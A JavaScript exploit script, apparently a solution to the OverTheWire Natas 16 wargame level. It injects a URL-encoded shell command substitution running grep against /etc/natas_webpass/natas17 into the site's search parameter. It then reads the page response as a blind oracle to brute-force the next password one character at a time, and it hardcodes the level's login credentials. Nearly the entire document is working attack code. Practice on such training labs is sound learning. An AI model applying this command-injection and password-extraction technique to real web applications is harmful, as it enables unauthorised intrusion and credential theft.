//WARNING - Isn't the most efficient code

let password = "";
let count = 0;
let alphanum = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
let alphanumc = alphanum.length;
let passwordc = 32; //assuming password has 32 characters
let fl1=0;fl2=0;
while(count!=passwordc)
{
	fl1=fl2=0;
	console.log(count);
	console.log(password);
	let oldp = password;
	for(let i=0;i<alphanumc;i++)
	{
		password += alphanum[i];
		let xhr = new XMLHttpRequest();
		let url = `http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+%5E${password}+%2Fetc%2Fnatas_webpass%2Fnatas17%29xylophone&submit=Search`;
		xhr.open('GET',url,false,"natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh");
		
		xhr.onload = function() {
		  if (xhr.status != 200) { // analyze HTTP status of the response
		    alert(`Error ${xhr.status}: ${xhr.statusText}`); // e.g. 404: Not Found
		  } else { // show the result
		  	let substr = (xhr.response).match(/(?<=<pre>\s+).*?(?=\s+<\/pre>)/gs);
		  	if(!substr)
		  	{
		  		console.log("PART OF PSWD");
		  		count++;
		  		fl1=1;
		  	}
		  	else
		  	{
		  		console.log("FAIL");
		  		password = oldp;
		  		fl2=1;
		  	  }
		  	}
		};
			xhr.onerror = function() {
		  alert("Request failed");
		};
			xhr.send();
			if(fl1==1) break;
			if(fl2==1) continue;
	}
}
console.log(password);	
